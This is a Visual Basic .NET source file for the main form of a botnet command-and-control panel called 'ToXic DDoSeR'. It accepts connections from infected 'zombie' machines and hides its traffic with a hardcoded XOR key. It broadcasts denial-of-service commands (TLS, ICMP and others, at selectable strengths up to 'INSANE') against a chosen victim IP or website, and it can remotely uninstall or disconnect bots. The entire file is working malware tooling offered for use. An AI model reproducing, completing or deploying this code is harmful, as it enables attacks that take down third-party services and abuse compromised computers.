﻿Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.Remoting.Messaging
Imports System.Text
Imports System.Threading
Imports System.Media
Public Class frmMain

    Public Shared lport, host_cap As Integer
    Public Shared xor_key As String = "T0X1C_PWD_1337"
    Public Shared _active As Boolean = False

    Private _zombies = New List(Of TcpClient)()

    Private rslv_ip, rslv_web As String

    '\x4D\x61\x6D\x61\x20\x49\x27\x6D\x20\x61\x20\x63\x72\x69\x6D\x69\x6E\x61\x6C\x2E\x2E\x2E

    Private Sub frmMain_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim player As New SoundPlayer(My.Resources.online)
        player.Play()

        comboCommand.SelectedIndex = 0
        comboPower.SelectedIndex = 1
    End Sub
    Private Sub frmMain_Closing(sender As Object, e As EventArgs) Handles MyBase.Closing
        _active = False
    End Sub

    Function XOR_EncryptDecrypt(ByVal data As Byte(), ByVal key As String) As Byte()
        'Credit: ChatGPT built specific this function
        Dim keyBytes As Byte() = Encoding.ASCII.GetBytes(key)
        Dim result As Byte() = New Byte(data.Length - 1) {}
        For i As Integer = 0 To data.Length - 1
            result(i) = data(i) Xor keyBytes(i Mod keyBytes.Length)
        Next
        Return result
    End Function

#Region "Form Handling / Events"
    Private Sub btnStart_Click(sender As Object, e As EventArgs) Handles btnStart.Click
        If String.IsNullOrEmpty(txtHost.Text) Then
            MessageBox.Show("You must specify a victim IP/website", "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Warning)
        ElseIf txtHost.Text = "127.0.0.1" Then
            MessageBox.Show("Thats your IP, dumbfuck! Try again...", "Noob Alert!", MessageBoxButtons.OK, MessageBoxIcon.Warning)
        Else
            If _rslv() = False Then
                MessageBox.Show("Unable to resolve IP/hostname", "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Else
                Dim _args As String = "d_atk:" & comboCommand.Text & "|" & rslv_ip & "|" & rslv_web

                'determine buffer size
                Dim _min, _max As String

                If comboPower.Text = "Weak" Then
                    _min = "100"
                    _max = "500"
                ElseIf comboPower.Text = "Moderate" Then
                    _min = "1000"
                    _max = "1500"
                ElseIf comboPower.Text = "Strong" Then
                    _min = "10000"
                    _max = "20000"
                ElseIf comboPower.Text = "INSANE" Then
                    _min = "60000"
                    _max = "65000"
                End If

                _args = _args & "|" & numPort.Value.ToString & "|" & _min & "|" & _max

                'send to zombies
                _broadcast(_args)

                'update queue status
                _task("Attacking " & rslv_ip & "...")

                'lock ui
                gui_mgr(0)
            End If
        End If
    End Sub

    Private Sub comboCommand_SelectedIndexChanged(sender As Object, e As EventArgs) Handles comboCommand.SelectedIndexChanged
        If comboCommand.Text = "TLS" Then
            numPort.Enabled = True
            numPort.Value = 443
        ElseIf comboCommand.Text = "ICMP" Then
            numPort.Enabled = False
            numPort.Value = 80
        Else
            numPort.Enabled = True
            numPort.Value = 80
        End If
    End Sub

    Private Function gui_mgr(opt As Boolean)
        CheckForIllegalCrossThreadCalls = False

        If opt = 0 Then
            'lock

            txtHost.Enabled = False
            numPort.Enabled = False
            comboPower.Enabled = False
            comboCommand.Enabled = False

            btnStart.Enabled = False
            btnStop.Enabled = True
        Else
            'unlock

            txtHost.Enabled = True
            numPort.Enabled = True
            comboPower.Enabled = True
            comboCommand.Enabled = True

            txtHost.Clear()
            numPort.Value = 80
            comboPower.SelectedIndex = 0
            comboCommand.SelectedIndex = 0

            btnStart.Enabled = True
            btnStop.Enabled = False
        End If
    End Function

    Private Sub btnStop_Click(sender As Object, e As EventArgs) Handles btnStop.Click
        'kill ddos attack
        _broadcast("halt")

        'update queue status
        _task("(IDLE...)")

        'unlock gui
        gui_mgr(1)
    End Sub

    Private Function _rslv() As Boolean
        CheckForIllegalCrossThreadCalls = False

        Dim _host As String = txtHost.Text.ToLower

        If Not (_host.StartsWith("http://") Or _host.StartsWith("https://")) Then
            _host = "http://" + _host
        End If

        Try
            Dim url As New Uri(_host)

            Dim hostname As IPHostEntry = Dns.GetHostByName(url.Host)
            Dim addr As IPAddress() = hostname.AddressList

            rslv_ip = addr(0).ToString()
            rslv_web = url.Host

            Return True
        Catch
            Return False
        End Try
    End Function

    Public Sub _begin()
        System.Threading.ThreadPool.QueueUserWorkItem(Sub() _listener())
    End Sub

    Private Sub tabEnable_Click(sender As Object, e As EventArgs) Handles tabEnable.Click
        frmListen.Show()
    End Sub

    Private Sub tabDisable_Click(sender As Object, e As EventArgs) Handles tabDisable.Click
        _active = False
        tabDisable.Enabled = False
        tabEnable.Enabled = True

        lport = 0
        _updt()
    End Sub

    Private Function _updt()
        CheckForIllegalCrossThreadCalls = False

        Me.Text = "ToXic DDoSeR  |  Port: " & lport.ToString & "  |  Online: " & _zombies.Count.ToString
    End Function

    Private Sub tabBuilder_Click(sender As Object, e As EventArgs) Handles tabBuilder.Click
        frmBuild.Show()
    End Sub

    Private Function _task(task_update)
        'mass-update zombie status
        For Each row As DataGridViewRow In zombieQueue.Rows
            If Not row.IsNewRow Then
                row.Cells(1).Value = task_update
            End If
        Next
    End Function

    Private Sub ucast_Uninstall_Click(sender As Object, e As EventArgs) Handles ucast_Uninstall.Click
        If zombieQueue.SelectedCells.Count > 0 Then
            Dim selectedRowIndex As Integer = zombieQueue.SelectedCells(0).RowIndex
            Dim get_ip As Object = zombieQueue.Rows(selectedRowIndex).Cells(0).Value

            _unicast("u_stall", get_ip.ToString())

            queue_del(get_ip)
        End If
    End Sub
    Private Sub ucast_Reconnect_Click(sender As Object, e As EventArgs) Handles ucast_Reconnect.Click
        If zombieQueue.SelectedCells.Count > 0 Then
            Dim selectedRowIndex As Integer = zombieQueue.SelectedCells(0).RowIndex
            Dim get_ip As Object = zombieQueue.Rows(selectedRowIndex).Cells(0).Value

            _unicast("r_cnct", get_ip.ToString())

            queue_del(get_ip)
        End If
    End Sub

    Private Sub ucast_Disconnect_Click(sender As Object, e As EventArgs) Handles ucast_Disconnect.Click
        If zombieQueue.SelectedCells.Count > 0 Then
            Dim selectedRowIndex As Integer = zombieQueue.SelectedCells(0).RowIndex
            Dim get_ip As Object = zombieQueue.Rows(selectedRowIndex).Cells(0).Value

            _unicast("d_cnct", get_ip.ToString())

            queue_del(get_ip)
        End If
    End Sub

    Private Sub bcast_Uninstall_Click(sender As Object, e As EventArgs) Handles bcast_Uninstall.Click
        Dim result As MsgBoxResult
        result = MsgBox("Do you want to continue?", MsgBoxStyle.YesNo, "Alert!")

        If result = MsgBoxResult.Yes Then
            _broadcast("u_stall")

            zombieQueue.Rows.Clear()
        End If
    End Sub

    Private Sub bcast_Reconnect_Click(sender As Object, e As EventArgs) Handles bcast_Reconnect.Click
        _broadcast("r_cnct")

        zombieQueue.Rows.Clear()
    End Sub

    Private Sub bcast_Disconnect_Click(sender As Object, e As EventArgs) Handles bcast_Disconnect.Click
        Dim result As MsgBoxResult
        result = MsgBox("Do you want to continue?", MsgBoxStyle.YesNo, "Alert!")

        If result = MsgBoxResult.Yes Then
            _broadcast("d_cnct")

            zombieQueue.Rows.Clear()
        End If
    End Sub
#End Region

#Region "TCP Listener / Keep-Alive"
    Private Sub _listener()
        CheckForIllegalCrossThreadCalls = False

        Dim listener As TcpListener = Nothing

        Try
            listener = New TcpListener(IPAddress.Any, lport)
            listener.Server.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, True)
            listener.Server.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, True)
            listener.Start()

            'execute keep-alive pulse
            System.Threading.ThreadPool.QueueUserWorkItem(Sub() _keepalive())
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

        While _active
            Try
                'wait for client connections
                Dim client As TcpClient = listener.AcceptTcpClient()

                'capture incoming data
                Dim stream As NetworkStream = client.GetStream()
                Dim data(client.ReceiveBufferSize - 1) As Byte
                Dim bytesRead As Integer = stream.Read(data, 0, data.Length)

                'decrypt data via xor
                data = XOR_EncryptDecrypt(data, xor_key)
                Dim message As String = Encoding.ASCII.GetString(data, 0, bytesRead)

                If message = "Armory call!" Then

                    'add to queue
                    _zombies.add(client)

                    'update data-grid
                    Dim _ip As String = DirectCast(client.Client.RemoteEndPoint, Net.IPEndPoint).Address.ToString()
                    queue_add(_ip)

                    'update title
                    _updt()

                    'send response message
                    Try
                        Dim response As Byte() = Encoding.ASCII.GetBytes("Welcome to the NET!")
                        response = XOR_EncryptDecrypt(response, xor_key)
                        stream.Write(response, 0, response.Length)
                    Catch ex As Exception
                        'dead zombie. remove from queue'
                        _zombies.Remove(client)

                        MsgBox(ex.Message)
                    End Try

                Else
                    'data anomaly. ignore...
                End If

            Catch ex As Exception
                MessageBox.Show(ex.Message, "Some critical shit just happened...")
            End Try
        End While

    End Sub

    Private Sub _keepalive()
        While _active
            If Not _zombies.Count = 0 Then
                Me.Invoke(Sub()
                              CheckForIllegalCrossThreadCalls = False

                              ' Use a regular For loop to iterate in reverse order
                              For i As Integer = _zombies.Count - 1 To 0 Step -1
                                  Dim _zombie As TcpClient = _zombies(i)
                                  Try
                                      _zombie.SendTimeout = 2000

                                      Dim content As Byte() = Encoding.ASCII.GetBytes("wake up neo...")
                                      Dim stream As NetworkStream = _zombie.GetStream()

                                      content = XOR_EncryptDecrypt(content, xor_key)
                                      stream.Write(content, 0, content.Length)

                                  Catch ex As Exception
                                      'remove from queue safely
                                      Try
                                          _zombies.RemoveAt(i)
                                      Catch ex2 As Exception
                                          MsgBox("Keep-Alive error: " + ex2.Message)
                                      End Try

                                      'remove from data-grid
                                      Dim _ip As String = DirectCast(_zombie.Client.RemoteEndPoint, Net.IPEndPoint).Address.ToString()
                                      queue_del(_ip)
                                  End Try
                              Next

                          End Sub)
            End If

            Thread.Sleep(10000)
        End While
    End Sub

#End Region

#Region "Data Management"
    Private Sub _broadcast(ByVal command As String)
        CheckForIllegalCrossThreadCalls = False

        For Each _zombie As TcpClient In _zombies
            Try
                _zombie.SendTimeout = 2000

                Dim content As Byte() = Encoding.ASCII.GetBytes(command)
                Dim stream As NetworkStream = _zombie.GetStream()

                'encrypt content
                content = XOR_EncryptDecrypt(content, xor_key)

                'send over socket
                stream.Write(content, 0, content.Length)
            Catch ex As Exception
                'remove from queue
                _zombies.Remove(_zombie)

                'remove from data-grid
                Dim _ip As String = DirectCast(_zombie.Client.RemoteEndPoint, Net.IPEndPoint).Address.ToString()
                queue_del(_ip)
            End Try
        Next
    End Sub
    Private Sub _unicast(ByVal command As String, ip As String)
        CheckForIllegalCrossThreadCalls = False

        For Each _zombie As TcpClient In _zombies
            Dim _ip As String = DirectCast(_zombie.Client.RemoteEndPoint, Net.IPEndPoint).Address.ToString()

            If ip = _ip Then
                _zombie.SendTimeout = 2000

                Try
                    Dim content As Byte() = Encoding.ASCII.GetBytes(command)
                    Dim stream As NetworkStream = _zombie.GetStream()

                    'encrypt content
                    content = XOR_EncryptDecrypt(content, xor_key)

                    'send over socket
                    stream.Write(content, 0, content.Length)
                Catch : End Try

                Exit For
            End If
        Next
    End Sub
#End Region

#Region "Form Management"
    Private Function queue_add(_ip)
        'add ip from data-grid
        CheckForIllegalCrossThreadCalls = False

        zombieQueue.ScrollBars = ScrollBars.None

        Dim _row As New DataGridViewRow()
        Dim _cell1, _cell2 As New DataGridViewTextBoxCell()

        _cell1.Value = _ip
        _cell2.Value = "(IDLE...)"

        _row.Cells.Add(_cell1)
        _row.Cells.Add(_cell2)

        Me.Invoke(Sub()
                      Try
                          'display on data-grid
                          zombieQueue.Rows.Add(_row)
                      Catch : End Try
                  End Sub)

        zombieQueue.ScrollBars = ScrollBars.Both

        _updt()
    End Function

    Private Function queue_del(_ip)
        'remove ip from data-grid
        CheckForIllegalCrossThreadCalls = False

        zombieQueue.ScrollBars = ScrollBars.None

        Try
            For i As Integer = zombieQueue.Rows.Count - 1 To 0 Step -1
                'iterate through data-grid and locate row containing matching ip address

                If zombieQueue.Rows(i).Cells(0).Value IsNot Nothing AndAlso zombieQueue.Rows(i).Cells(0).Value.ToString() = _ip Then
                    Me.Invoke(Sub()
                                  'remove from data-grid
                                  Try
                                      zombieQueue.Rows.RemoveAt(i)
                                      'zombieQueue.Refresh()
                                  Catch Ex As Exception
                                      MsgBox(Ex.Message)
                                  End Try
                              End Sub)
                End If
            Next
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try

        zombieQueue.ScrollBars = ScrollBars.Both

        _updt()
    End Function
#End Region

End Class
